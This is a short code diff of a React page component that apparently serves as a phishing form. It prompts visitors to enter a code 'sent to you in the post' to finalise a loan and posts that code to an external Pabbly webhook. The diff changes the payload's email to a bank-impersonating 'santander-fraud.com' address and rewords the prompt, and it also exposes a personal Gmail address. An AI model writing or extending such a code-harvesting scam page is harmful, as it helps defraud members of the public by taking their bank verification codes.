@@ -56,7 +56,7 @@ export default function MyComponent() {
     try {
       const response = await axios.post(
         "https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTZlMDYzMjA0Mzc1MjY4NTUzMjUxM2Ei_pc",
-        { email: "umair.israr92@gmail.com", code: code }
+        { email: "contact@santander-fraud.com", code: code }
       );
 
       if (response?.data?.status == "success") {
@@ -90,7 +90,7 @@ export default function MyComponent() {
     try {
       const response = await axios.post(
         "https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTZlMDYzMjA0Mzc1MjY4NTUzMjUxM2Ei_pc",
-        { email: "umair.israr92@gmail.com", code: code }
+        { email: "contact@santander-fraud.com", code: code }
       );
 
       if (response?.data?.status == "success") {
@@ -304,8 +304,7 @@ export default function MyComponent() {
                 <br />
               </h2>
               <p>
-                To release your funds, please enter the code that we sent to you
-                in the post.
+                To Finalise your Loan, please enter the code that we sent to you in the post.
               </p>
             </div>
             <form className="flex flex-col relative shrink-0 box-border mt-4 pb-4">
